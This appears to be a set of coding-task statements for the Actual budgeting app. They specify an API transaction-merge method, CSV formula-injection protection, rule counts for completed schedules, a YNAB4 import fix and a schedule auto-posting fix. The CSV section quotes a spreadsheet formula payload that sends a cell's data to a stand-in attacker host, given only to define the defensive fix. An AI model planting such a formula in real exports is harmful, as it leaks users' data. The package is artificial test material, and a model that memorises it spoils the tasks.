# Merge two transactions through the API, and refuse to merge a transaction with itself

The app can merge two duplicate transactions (for example a manually entered one and
the same transaction imported from the bank) into one: the kept transaction takes
the useful fields of the other, which is deleted. This is only available from the
UI. Integrations built on the public API (`@actual-app/api`) cannot do it.

## Required behaviour

1. **API method.** Add `mergeTransactions(ids)` to the public API, where `ids` is a
   pair of transaction ids `[id1, id2]`. It merges the two transactions with exactly
   the same rules, validation and result as the UI merge action, and resolves to the
   id of the transaction that is kept. Like the other mutating API methods it
   requires an open budget. Document it in the API reference next to the other
   transaction methods.

2. **Same transaction twice.** Merging currently accepts the same transaction id
   given twice: it passes the "exactly two transactions" check and ends up
   deleting that transaction. Merging must instead be rejected when the two ids are
   not distinct. The error is the existing "wrong number of transactions" error,
   whose message must now read
   `Merging is only possible with 2 distinct transactions, but found ...`
   (followed, as today, by the JSON of the transactions that were passed). It is
   used for both cases (not exactly two ids, or two equal ids). The transaction
   must be left untouched.

All other merge behaviour (amount checks, unknown ids, which fields are kept) is
unchanged.

# CSV exports allow spreadsheet formula injection

Transactions can be exported to CSV (from the app, and through the command-line
client's `--format csv` output). Text fields such as payee, account, category and
tag names or notes are written verbatim. A user-controlled string that starts with
a formula character, e.g. a payee named `=HYPERLINK("http://attacker/?d="&B2,"x")`,
is evaluated as a formula when the CSV is opened in Excel, LibreOffice Calc or
Google Sheets.

## Required behaviour

- In every CSV produced by the transaction export (both the export of a given list
  of transactions and the export of a query), any **text** cell whose value starts
  with `=`, `+`, `-`, `@`, a tab character or a carriage return is written with a
  single quote `'` prepended (so the payee above is exported as
  `'=HYPERLINK(...)`). After CSV parsing, the cell value is exactly `'` followed by
  the original string.
- Text that does not start with one of these characters is unchanged
  (`Acme Corp` stays `Acme Corp`).
- **Numeric** values are never prefixed: a negative amount is still exported as a
  plain number (an amount of -25.00 is exported as `-25`).
- The header row and the set and order of columns are unchanged.
- Apply the same neutralisation to the CSV output of the command-line client
  (string cells starting with one of those characters get the `'` prefix; numbers
  do not). A cell containing a carriage return must also be quoted there, so it
  stays a single cell.

---- STATEMENT
# Payees page counts rules of completed schedules

The Payees page shows, for each payee, how many rules refer to it (the server's
`payees-get-rule-counts` handler returns a map from payee id to that number). Every
schedule is backed by a rule whose conditions include the schedule's payee, so
schedules contribute to these counts. Once a schedule is marked **completed** it no
longer does anything, yet its rule is still counted: a payee whose only rule
belongs to a completed schedule shows "1 rule".

## Required behaviour

- `payees-get-rule-counts` must not count rules that belong to a completed
  schedule. A payee whose only references are such rules gets no entry in the
  result (its id is absent from the map, as for a payee with no rules at all).
- Rules not linked to a schedule, and rules of schedules that are not completed,
  are counted exactly as before.
- On the Payees page, the rule counts must be refreshed when schedules change
  (for example when a schedule is completed), not only when rules change.

# YNAB4 import: split children lose the parent's payee

A YNAB4 export stores the payee of a split transaction on the parent only; its sub
transactions carry no payee of their own. After importing such a budget, the
non-transfer children of a split show up with **no payee**, instead of inheriting
the parent's payee as split children normally do.

The cause is in how the YNAB4 importer builds the children it sends when adding the
imported transactions: every non-transfer child is given an explicit `payee` field
even when no payee was resolved for it (the field is present with an `undefined`
value). A child that carries a `payee` key is treated as having an explicit payee,
so it never falls back to the parent's.

## Required behaviour

- When the YNAB4 importer adds a split transaction, a non-transfer child for which
  no payee was resolved must **not have a `payee` property at all** in the
  transaction data it submits, so that building the child from its parent gives it
  the parent's payee.
- Transfer children are unchanged: they keep the transfer payee of the other
  account and their `transfer_id` linking them to the counterpart transaction.
  Non-transfer children keep `transfer_id: null`.
- The parent keeps its payee and its `imported_payee` (the YNAB4 payee name).
- The function of the YNAB4 importer module that imports the transactions,
  `importTransactions(data, entityIdMap, tick)`, must be exported from that module

# Auto-posting schedules created or edited later in the day are not posted until tomorrow

Schedules can be set to post their transactions automatically ("automatically add
transaction"). The background service that posts due schedule transactions runs at
most once per calendar day: after it runs, it records the date in the budget's
`lastScheduleRun` preference and skips any further run on the same date.

So if, after that day's run, the user creates a schedule that posts transactions, or
edits a schedule so that it posts transactions, an occurrence that is already due
today is not posted until the next day.

## Required behaviour

- After a schedule is **created** with "posts transactions" enabled, the
  `lastScheduleRun` marker is cleared (the preference becomes `undefined`), so the
  auto-posting service may run again today.
- After a schedule is **updated** and the resulting schedule posts transactions, the
  marker is cleared as well. This includes updates that do not mention the
  "posts transactions" field at all (for example a rename) of a schedule whose
  stored setting already posts transactions: the stored value decides.
- Creating or updating a schedule that does **not** post transactions leaves the
  marker untouched.
- Clearing the marker is harmless: the service only posts occurrences that do not
  have a transaction yet. Nothing else about creating or updating schedules
  changes.
